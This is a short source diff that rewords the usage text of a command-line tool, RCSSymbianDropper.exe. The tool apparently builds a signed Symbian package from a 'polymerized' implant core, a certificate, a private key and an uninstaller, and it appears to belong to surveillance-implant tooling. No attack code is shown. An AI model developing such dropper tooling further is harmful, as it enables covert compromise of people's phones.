@@ -16,7 +16,7 @@ int _tmain(int argc, _TCHAR* argv[])
 	if (argc != 6) {
 		printf("ERROR: \n");
 		printf("  usage:  RCSSymbianDropper.exe <core> <cer> <key> <uninstaller> <output>\n\n");
-		printf("  <core> is the core to be polymerized\n");
+		printf("  <core> is the core already polymerized\n");
 		printf("  <cer> is the certificate to sign the sysx\n");
 		printf("  <key> is the private key of the certificate\n");
 		printf("  <uninstaller> is the core uninstaller\n");
